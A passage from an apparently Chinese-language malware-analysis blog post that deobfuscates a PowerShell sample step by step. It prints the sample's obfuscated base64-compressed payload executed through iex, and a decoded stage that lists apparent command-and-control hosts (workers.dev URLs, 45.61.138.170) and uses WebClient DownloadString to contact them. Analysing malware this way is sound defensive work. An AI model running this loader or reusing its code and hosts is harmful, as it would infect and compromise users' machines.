))</span><br></pre></td></tr></table></figure>
<ul>
<li>从代码中发现有invoke-expression，其功能和iex相同，都能执行一段ps脚本，所以直接在命令窗口中输出解密后的数据：</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713181913367.png" alt="image-20200713181913367"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  <span class="number">80</span>g ( [<span class="type">TyPe</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;SYs&#x27;</span>,<span class="string">&#x27;tEM&#x27;</span>,<span class="string">&#x27;verT&#x27;</span>,<span class="string">&#x27;.cOn&#x27;</span>) ) ;    <span class="built_in">SET-item</span> (<span class="string">&#x27;Var&#x27;</span>+<span class="string">&#x27;iABLe:&#x27;</span>+<span class="string">&#x27;86f&#x27;</span>)  (  [<span class="type">tyPe</span>](<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;iO.&#x27;</span>,<span class="string">&#x27;N.coMPreSSi&#x27;</span>,<span class="string">&#x27;CO&#x27;</span>,<span class="string">&#x27;MPressIO&#x27;</span>,<span class="string">&#x27;MO&#x27;</span>,<span class="string">&#x27;DE&#x27;</span>)  );  <span class="built_in">Set</span> (</span><br><span class="line"><span class="string">&#x27;16&#x27;</span>+<span class="string">&#x27;7u&#x27;</span>+<span class="string">&#x27;2X&#x27;</span>) ( [<span class="type">TYPe</span>](<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;5&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;m.&#x27;</span>,<span class="string">&#x27;t.En&#x27;</span>,<span class="string">&#x27;YSTe&#x27;</span>,<span class="string">&#x27;Tex&#x27;</span>,<span class="string">&#x27;cO&#x27;</span>,<span class="string">&#x27;DinG&#x27;</span>)  )  ;  .( <span class="variable">$</span>&#123;s`He`lLiD&#125;[<span class="number">1</span>]+<span class="variable">$</span>&#123;ShE`lLid&#125;[<span class="number">13</span>]+<span class="string">&#x27;X&#x27;</span>)(.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;NeW&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;-ObjeC&#x27;</span>) (<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;e</span></span><br><span class="line"><span class="string">AMReADE&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;sy&#x27;</span>,<span class="string">&#x27;SteM.IO.S&#x27;</span>,<span class="string">&#x27;tr&#x27;</span>)(( &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;je&#x27;</span>,<span class="string">&#x27;NeW-Ob&#x27;</span>,<span class="string">&#x27;Ct&#x27;</span>)  (<span class="string">&quot;&#123;8&#125;&#123;2&#125;&#123;10&#125;&#123;0&#125;&#123;3&#125;&#123;4&#125;&#123;9&#125;&#123;5&#125;&#123;6&#125;&#123;1&#125;&#123;7&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;.compRE&#x27;</span>,<span class="string">&#x27;Es&#x27;</span>,<span class="string">&#x27;.I&#x27;</span>,<span class="string">&#x27;sS&#x27;</span>,<span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;.DeF&#x27;</span>,<span class="string">&#x27;laT&#x27;</span>,<span class="string">&#x27;treAm&#x27;</span>,<span class="string">&#x27;SysteM&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>)( [<span class="type">sYSTeM.Io.mE</span></span><br><span class="line"><span class="type">mORYsTREam</span>]  ( <span class="built_in">gCI</span> vaRIAbLe:<span class="number">80</span>G  ).<span class="string">&quot;vaL`UE&quot;</span>::(<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;tr&#x27;</span>,<span class="string">&#x27;fromBaS&#x27;</span>,<span class="string">&#x27;Ing&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;64S&#x27;</span>).Invoke( (<span class="string">&quot;&#123;32&#125;&#123;3&#125;&#123;63&#125;&#123;22&#125;&#123;30&#125;&#123;89&#125;&#123;103&#125;&#123;68&#125;&#123;1&#125;&#123;57&#125;&#123;79&#125;&#123;67&#125;&#123;34&#125;&#123;18&#125;&#123;14&#125;&#123;64&#125;&#123;7&#125;&#123;62&#125;&#123;100&#125;&#123;21&#125;&#123;69&#125;&#123;74&#125;&#123;41&#125;&#123;</span></span><br><span class="line"><span class="string">85&#125;&#123;53&#125;&#123;95&#125;&#123;93&#125;&#123;16&#125;&#123;44&#125;&#123;104&#125;&#123;8&#125;&#123;45&#125;&#123;38&#125;&#123;59&#125;&#123;116&#125;&#123;84&#125;&#123;82&#125;&#123;49&#125;&#123;107&#125;&#123;27&#125;&#123;5&#125;&#123;60&#125;&#123;55&#125;&#123;61&#125;&#123;4&#125;&#123;33&#125;&#123;48&#125;&#123;29&#125;&#123;88&#125;&#123;75&#125;&#123;71&#125;&#123;90&#125;&#123;50&#125;&#123;0&#125;&#123;15&#125;&#123;58&#125;&#123;113&#125;&#123;2&#125;&#123;20&#125;&#123;17&#125;&#123;115&#125;&#123;78&#125;&#123;39&#125;&#123;10&#125;&#123;109&#125;&#123;81&#125;&#123;24&#125;&#123;98&#125;&#123;54&#125;&#123;118&#125;&#123;114&#125;&#123;91&#125;&#123;</span></span><br><span class="line"><span class="string">117&#125;&#123;111&#125;&#123;70&#125;&#123;80&#125;&#123;23&#125;&#123;108&#125;&#123;97&#125;&#123;77&#125;&#123;42&#125;&#123;19&#125;&#123;101&#125;&#123;9&#125;&#123;87&#125;&#123;96&#125;&#123;51&#125;&#123;46&#125;&#123;76&#125;&#123;86&#125;&#123;112&#125;&#123;56&#125;&#123;105&#125;&#123;37&#125;&#123;31&#125;&#123;25&#125;&#123;94&#125;&#123;11&#125;&#123;40&#125;&#123;36&#125;&#123;47&#125;&#123;99&#125;&#123;13&#125;&#123;35&#125;&#123;72&#125;&#123;52&#125;&#123;110&#125;&#123;66&#125;&#123;73&#125;&#123;6&#125;&#123;102&#125;&#123;12&#125;&#123;106&#125;&#123;65&#125;&#123;43&#125;&#123;83&#125;&#123;26&#125;&#123;28&#125;&#123;92&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">MMe0WbO66rJIN8mS5l&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;hpAWVWWz6TzvgF/2lVpLbq6rIJkZenEHm+rNVR8xFp3j1QjX6vaLTbXdQ8c9Nwf&#x27;</span>,<span class="string">&#x27;7Ze&#x27;</span>,<span class="string">&#x27;ZZ7lcYHOVs9k6R/j4NkgWS4qD2hT97ybnQ&#x27;</span>,<span class="string">&#x27;q7BXPqEzwjl4CNkV2XkUd3RGjh&#x27;</span>,<span class="string">&#x27;nbx/DZByc6QYmU866IhjSOcdmjrqeI&#x27;</span>,<span class="string">&#x27;9fH</span></span><br><span class="line"><span class="string">VM86ImNaE/CG1FMvGa+TRrtNazZBUHelBM+pLMX&#x27;</span>,<span class="string">&#x27;GU3Ayd0J+HMw/cstjt/L0zV22dvb36RgZjzb2IQ7ffLzdxTnFnOXtquR3cYyJ4vdD8jooYxpSXcSrdVUhm4X7qsMHc9I6eeYF+wRQpw8DfE51BpNK35KHmW91&#x27;</span>,<span class="string">&#x27;ENd5jEGc1NTUoMLPc&#x27;</span>,<span class="string">&#x27;fEt1zvrs7PR&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Ea40e0WjX4LaYRbnb5AwDDzDMyif7vdL&#x27;</span>,<span class="string">&#x27;lVrKITk8l0N2Ck6ibxpHBrU&#x27;</span>,<span class="string">&#x27;TsjA50nqS+LQmPX0ZwxIwqGySrXx+/3VlcTMAI9BvkLuI5rzMy37CmRqmA6obOLhqJlPvrCra6cA251KWo/VXR5/AZiuJ3jwp08mWRF+UY2z&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;6eRhjmyxDZmRDkBqI8UUAt</span></span><br><span class="line"><span class="string">nVr1lg1927pgTuCl9OuigRnz&#x27;</span>,<span class="string">&#x27;yf&#x27;</span>,<span class="string">&#x27;0cpj/Ami&#x27;</span>,<span class="string">&#x27;47NQc7RRantH5U&#x27;</span>,<span class="string">&#x27;aCzI6KnYFZAjd9uIgWXBAf+YsSxl&#x27;</span>,<span class="string">&#x27;PG1+HbE/IihXy/CsTKilhOHujJjr089dDSu9G6KXoE5eQXNlaSi5IyjMvfgCFLf4+H6lIe5cLc&#x27;</span>,<span class="string">&#x27;6+Oiw1Eq3E9apy4q0WJEOT&#x27;</span>,<span class="string">&#x27;TYz39t</span></span><br><span class="line"><span class="string">2xCR&#x27;</span>,<span class="string">&#x27;A5J9lTFs1yuYDzIqQEnNIh2RBi2OOyIhNLD3eOa5/lolXqs&#x27;</span>,<span class="string">&#x27;nJtNVAVG6aCTz8sDwfMGTtSpyAtSeuOst3+5tu2WYs&#x27;</span>,<span class="string">&#x27;k9Gfc1SXPxBx6nCzppeqr25xue&#x27;</span>,<span class="string">&#x27;N5pjXKDTdWDcG22P5ibXMjy80F7Th2Pqx2PqQQTH8YQ/I4/X/aOQwTXLTLF61Rf62Wq/</span></span><br><span class="line"><span class="string">KazOLNJLvtJXdofVeJF6jNDgJjzWdsk3DMOOWqgc+G1NKLugyxPnjcMcDbg61cyb9ipwd6ORUfnOBIn44Np4AwfI0F+&#x27;</span>,<span class="string">&#x27;Aym2xFGLPIa5i46Ht8l3s4UWEJtNEn5chj9k27i&#x27;</span>,<span class="string">&#x27;iuQ09kNOv2KsiifxUy5LM3CTBVOVzDxH7f/Z+18RIldGjsHU29OYETZfSgpX&#x27;</span>,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">cWjDjVk4pVq2gqepcIe3V7wZcMWg/BFq&#x27;</span>,<span class="string">&#x27;pOTXKAuruzs1MIbcJIIAdEzWXzv19VNWAc951PoAPd&#x27;</span>,<span class="string">&#x27;DwF4E49MUywYrijww305TbnsX1z7+Rz9aRFPMw4O0lUUM&#x27;</span>,<span class="string">&#x27;fVjxV6NIEv&#x27;</span>,<span class="string">&#x27;0iuwbD&#x27;</span>,<span class="string">&#x27;aS5j47pHda&#x27;</span>,<span class="string">&#x27;8/TRKvE3eBuothE4075G&#x27;</span>,<span class="string">&#x27;0Fppc5usrRmJ/</span></span><br><span class="line"><span class="string">gvkhZh9EVQijv6N2&#x27;</span>,<span class="string">&#x27;8hcYp+KLV4L24IqTtS+tl3sZ9tMGZ1tsWvrqh&#x27;</span>,<span class="string">&#x27;HOfzzE+Uj/vfChTrpL1F2X/&#x27;</span>,<span class="string">&#x27;p0T0CoeADXPrVnKeKkK5VaYmRWeEyyigOkzF5wVGNQG5Sk3d0lOvyfrXbzSKOMq0n&#x27;</span>,<span class="string">&#x27;vq1W62q1auGHDcO0IpILi6jwQI04&#x27;</span>,<span class="string">&#x27;bWKm3XYd3Z&#x27;</span>,<span class="string">&#x27;Rf</span></span><br><span class="line"><span class="string">7/XbLaPjih&#x27;</span>,<span class="string">&#x27;WExPi2lvUs&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;C5PfBiRcuKA5m4XaOCJydOHPm&#x27;</span>,<span class="string">&#x27;uYw4UHjzN/Ryj+LkQCD1&#x27;</span>,<span class="string">&#x27;kflpu5ijFEWShOqRChrPgKE00J+JPyhG0ur6DMAUyJnbJCaZWtk44qVay4LFU6fRpKZgEaqt2QGj90OeZq5kcU4V70WRWDWH/mazK0RXkf44ywXNVmq&#x27;</span>,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">iGkMT&#x27;</span>,<span class="string">&#x27;5GPvrESFOyMupsLhBR+HaeZK6RIhv8KbIkzfXk/jv6H22/mUlwdRQ0DmB&#x27;</span>,<span class="string">&#x27;5ihMUPYt0&#x27;</span>,<span class="string">&#x27;1j&#x27;</span>,<span class="string">&#x27;2mGN2U&#x27;</span>,<span class="string">&#x27;fyhUSSXcgah6&#x27;</span>,<span class="string">&#x27;aXuj&#x27;</span>,<span class="string">&#x27;HN6a4qEt/64A&#x27;</span>,<span class="string">&#x27;WxM3i&#x27;</span>,<span class="string">&#x27;7G9tcJDmYMErAcT2wbZL1z/rHD3so6Xi7Od1uTrabHgkjkUp2FwU/aM9J+ih</span></span><br><span class="line"><span class="string">R2kuAt+Q+bTXxeTiX&#x27;</span>,<span class="string">&#x27;arCUKmKgV/fpeyTN6xNC0bx0zQhqI79Bf67aIpbcptPLjmjl5RdvIU4DyOZoSZC9225jLyBFKL+ZTD37K+90wPV6PeLRrvVb3wu3h01&#x27;</span>,<span class="string">&#x27;xHa5BIDjpe0l8p8lcYYeXkKN3JL77ZCRpn88&#x27;</span>,<span class="string">&#x27;NBtYYLq7kPMFZGu8s61gxzCJzDhP8XJpvr</span></span><br><span class="line"><span class="string">/nWcwxaUihHoRgLEqErOsqMAv8KaaRiZ/uKoBYFFDs+LZU6x+uCYJDrrG+yQ&#x27;</span>,<span class="string">&#x27;DPXwYIsjL1AuSF8EPV6U81REQEqN7n/Ln0SLnP9Dh8LQuYFalhBvzQaW4y6yNR&#x27;</span>,<span class="string">&#x27;sIEG48SZ8anmlw2&#x27;</span>,<span class="string">&#x27;W/+h3553pA8h5gY&#x27;</span>,<span class="string">&#x27;bWh2e+Zgnx49&#x27;</span>,<span class="string">&#x27;xeh&#x27;</span>,<span class="string">&#x27;JB/&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;ux&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;689+U1efUpjlxmOTqJAX6wC/YhE4FLxThNGag68+/fN/PE+/O/qVfzxG6uqdfVaNL7dOSWl22TQw+OTZrdd6HqmNRofP+x&#x27;</span>,<span class="string">&#x27;TedqqhT6&#x27;</span>,<span class="string">&#x27;x3URnq&#x27;</span>,<span class="string">&#x27;re8uH11ciLI&#x27;</span>,<span class="string">&#x27;T0LIYAoYrmWop2g2vS8PSgalKccxcnH&#x27;</span>,<span class="string">&#x27;vogQGl+Z4uIQJWHFOTkOBPZ&#x27;</span>,<span class="string">&#x27;h6i6dQP</span></span><br><span class="line"><span class="string">ssU1znGjHIFkRyWkHPWCAsTrodgh7cm&#x27;</span>,<span class="string">&#x27;4Z10jnENyEnsoje5hKc3gkCnuOP9A3&#x27;</span>,<span class="string">&#x27;fNpsnvQY&#x27;</span>,<span class="string">&#x27;oFoENf4HsC4xZy0lhuMzAdCCDECZj&#x27;</span>,<span class="string">&#x27;UZQ08/XTPf6a45UvM1Iga&#x27;</span>,<span class="string">&#x27;XQwp1jMWfi1BQM7yS&#x27;</span>,<span class="string">&#x27;3SgGQn+kckowYl8YqUIRNU67RaPd7jU+a7/jpLqZpklqq</span></span><br><span class="line"><span class="string">MVVbFKZ00FoUMAkMQbOS&#x27;</span>,<span class="string">&#x27;JAgwbbGPN5kfT2mAuJi&#x27;</span>,<span class="string">&#x27;glK0LH1mZTcpkIX&#x27;</span>,<span class="string">&#x27;mTuA9j&#x27;</span>,<span class="string">&#x27;gqx1GA&#x27;</span>,<span class="string">&#x27;KgZJgMpeNSyWm4YY&#x27;</span>,<span class="string">&#x27;GhOFE2vyOBzYBxv3rGdn&#x27;</span>,<span class="string">&#x27;OegWOl&#x27;</span>,<span class="string">&#x27;1dVVX31V3WJ/008hON&#x27;</span>,<span class="string">&#x27;0dCJRRdc8mvVuEE2wU&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;wcSYZasUPr/AA==&#x27;</span>,<span class="string">&#x27;yzx</span></span><br><span class="line"><span class="string">Lcl5zOV/+A61B87nheA0ScMLkdTp2GSEhUmNpAHX/+OFhFft5mMTCH5kwgEvdscazKzBHE&#x27;</span>,<span class="string">&#x27;CGYbVT/QcLcHjxyvar7gs3WaCCRqDqk/sUfISX2k&#x27;</span>,<span class="string">&#x27;TeT1nI+pETvSAi&#x27;</span>,<span class="string">&#x27;OwVZUfphJs0LT1Eqwk2VTBWwqpK8hEyniEIGIWcwoi&#x27;</span>,<span class="string">&#x27;nfr3BN1Xrx+&#x27;</span>,<span class="string">&#x27;NuJa4oA</span></span><br><span class="line"><span class="string">Xnrnpd+2OkHWiXeJm4wgNcwwGtkO54dfH6r&#x27;</span>,<span class="string">&#x27;pY8VVDolvV/v8orPYWIjBxJ/r1Tnn7s0Y+bs8cePi4JrCPqgPlBJRx+vyI/Z5QnMO9QxTBYpalkYN9inkG24W54w/AQ7H5DuV/VnOR/ap2cFI12+4S8WZShQh97CykUKyAT6bdetKLfGA0uJPYKeRjYVPitNIS7Xs</span></span><br><span class="line"><span class="string">rq2KCoHqhkx203a&#x27;</span>,<span class="string">&#x27;1zMa9Uyf+tQ3V+qdHR7&#x27;</span>,<span class="string">&#x27;VH+DmKRenHOHa3yh6v/hzL/1KMVzMaYMxhiGMvWtO3LR19GAc7Jb&#x27;</span>,<span class="string">&#x27;0VqmJR9XcmHcqBBQGYuuNPbtzi1Eawk4PSXlVuYZ2szIqNQKVZ&#x27;</span>,<span class="string">&#x27;6Kn4T4kq+X5td6bXO03bS2m/Z209nW9HOhWdpnLU3G1yY+5fgJ7</span></span><br><span class="line"><span class="string">7GrNYT4&#x27;</span>,<span class="string">&#x27;xW8+fhBi6aXeor6/&#x27;</span>,<span class="string">&#x27;JHtyAO0lXY&#x27;</span>,<span class="string">&#x27;yV1MHMeUO0oqzMklFkQ&#x27;</span>,<span class="string">&#x27;yTfM+JKn0UDFcMrkZrk&#x27;</span>,<span class="string">&#x27;fc+b5aFhBB/yTWOfEc1U8BQtzIsr7C89y8Vx5Rl8hCJ0NuqBJCCEQ9p&#x27;</span>,<span class="string">&#x27;JZVxtiSc&#x27;</span>,<span class="string">&#x27;fGw2mCVDh2d9&#x27;</span>,<span class="string">&#x27;KQBUYQuy2SGeXWCOadUc&#x27;</span>,<span class="string">&#x27;KrwH&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;WNcc7qZguKNfuseFrvArLgjkNSr7JCtlT0oTVUnsqNCXFBB1XGsDVbryGG&#x27;</span>,<span class="string">&#x27;/Q7o+28t/etB6/FXjTBoLiMwwDdrdfqgIdZyW2FtbjDWuA9cGQOTYUpvjznADIqrXtE6xQDT9tGMW5UXgylGVz7CongMgRXPmKfqauV9Vay2VUZoKVMoGJ8W9SmxEQdZmmTJQ74aj</span></span><br><span class="line"><span class="string">lwy451hMz15lHfIm+aqLFWwiyPTJ1VNOhyI+EOQ2QUXJHiNr&#x27;</span>,<span class="string">&#x27;hkh8qCLtgr8yCMHf&#x27;</span>,<span class="string">&#x27;fs5GBE4puqBt63wvdyfq25VrwfqlbEcvLZvjD+TLugwm&#x27;</span>,<span class="string">&#x27;Oq0FKCz8iZnLvMH+R3wzeZPlTIlcHXPS0avSOij1FFH0W2ptImBGI2TtIrnHYO1hNCvMzP+5tFCIM0cZJz</span></span><br><span class="line"><span class="string">jBjE/xQpp8R4q0o9/1IpGiMWI5CCb4RiTPT81GEz1kTt9317OKXvZhxgMq+p7K+4v6z8mfU5xU+9iglI3AJCH6efZJMHcG0seDGyR6WOq&#x27;</span>,<span class="string">&#x27;t7WT/Sjtv5F&#x27;</span>)) ,   <span class="variable">$86f::</span><span class="string">&quot;d`eCOMP`Ress&quot;</span> )) ,  (<span class="built_in">get-chIlditeM</span>  (<span class="string">&quot;variaBLE:&quot;</span>+<span class="string">&quot;16&quot;</span>+<span class="string">&quot;7U2&quot;</span>+<span class="string">&quot;x&quot;</span>)</span><br><span class="line">).<span class="string">&quot;VAL`Ue&quot;</span>::<span class="string">&quot;AsC`Ii&quot;</span>)).(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;oEnd&#x27;</span>,<span class="string">&#x27;EadT&#x27;</span>).Invoke() </span><br></pre></td></tr></table></figure>
<ul>
<li>从解密的代码中分析，这端数据替换后使用base64接码，然后解压缩，最后使用iex执行。再次输出数据解密后的数据(PS：因为powershell中换行的问题，所以命令最好一行输入，多行输入的命令可能会出错)，去混淆结果如下：</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="number">9</span>rd4&#125; = [<span class="type">type</span>](<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ronme&#x27;</span>,<span class="string">&#x27;env&#x27;</span>,<span class="string">&#x27;nt&#x27;</span>); <span class="comment">##environment</span></span><br><span class="line"><span class="variable">$</span>&#123;remotehostarr&#125; = <span class="selector-tag">@</span>(</span><br><span class="line">(<span class="string">&quot;&#123;4&#125;&#123;8&#125;&#123;5&#125;&#123;7&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;worke&#x27;</span>,<span class="string">&#x27;xd&#x27;</span>,<span class="string">&#x27;obr0.&#x27;</span>,<span class="string">&#x27;/hello.tyvb&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;tps&#x27;</span>,<span class="string">&#x27;rs.dev&#x27;</span>,<span class="string">&#x27;:/&#x27;</span>,<span class="string">&#x27;t&#x27;</span>), <span class="comment">##https://hello.tyvbxdobr0.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;11&#125;&#123;12&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;10&#125;&#123;13&#125;&#123;8&#125;&#123;4&#125;&#123;5&#125;&#123;2&#125;&#123;9&#125;&#123;14&#125;&#123;6&#125;&#123;7&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;gc.&#x27;</span>,<span class="string">&#x27;ly-sound-d&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;xogxio&#x27;</span>,<span class="string">&#x27;kers.&#x27;</span>,<span class="string">&#x27;dev&#x27;</span>,<span class="string">&#x27;e.ygr&#x27;</span>,<span class="string">&#x27;wo&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;://c&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),   </span><br><span class="line"><span class="comment">##https://curly-sound-d93e.ygrhxogxiogc.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;5&#125;&#123;1&#125;&#123;6&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;vc.workers&#x27;</span>,<span class="string">&#x27;ps://old-mud-23&#x27;</span>,<span class="string">&#x27;.de&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;htt&#x27;</span>,<span class="string">&#x27;cb.tkbizu&#x27;</span>),</span><br><span class="line"><span class="comment">##https://old-mud-23cb.tkbizulvc.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;.138.&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;//45.61&#x27;</span>,<span class="string">&#x27;http:&#x27;</span>) <span class="comment">##http://45.61.138.170</span></span><br><span class="line">)</span><br><span class="line"><span class="variable">$</span>&#123;lockendpoint&#125; = (<span class="string">&quot;&#123;7&#125;&#123;1&#125;&#123;0&#125;&#123;8&#125;&#123;4&#125;&#123;3&#125;&#123;6&#125;&#123;5&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e/l&#x27;</span>,<span class="string">&#x27;=sit&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;oadlo&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;.php?r&#x27;</span>)</span><br><span class="line"><span class="comment">##web/index.php?r=site/loadlock</span></span><br><span class="line"><span class="variable">$</span>&#123;tinyendpoint&#125; = (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;oad.php&#x27;</span>) <span class="comment">##load.php&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check-singlehost</span>   ##判断服务器是否存活</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">param</span>(<span class="variable">$</span>&#123;hosttocheck&#125;)</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="variable">$</span>&#123;res&#125; = (<span class="built_in">new-object</span> net.webclient).(downloadstring).invoke((<span class="variable">$</span>&#123;hosttocheck&#125; + (<span class="string">&#x27;/check/&#x27;</span>)))</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$</span>&#123;res&#125; <span class="operator">-eq</span> <span class="string">&#x27;ok&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">	